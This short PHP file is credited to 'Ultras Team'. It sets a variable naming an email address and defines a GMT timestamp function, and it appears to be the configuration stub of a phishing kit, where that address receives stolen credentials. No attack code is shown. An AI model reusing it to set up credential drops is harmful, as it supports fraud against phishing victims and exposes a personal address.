<?php
	/*
	/ -> All Created By Ultras Team
    / -> fb.com/Dr.Gov
	*/
	

	// ================================= //

	$yours = "nemohamed1@yandex.com";

	// ================================= //


	function now() {
		date_default_timezone_set('GMT');
		return date("d/m/Y h:i:sa");
	}

?>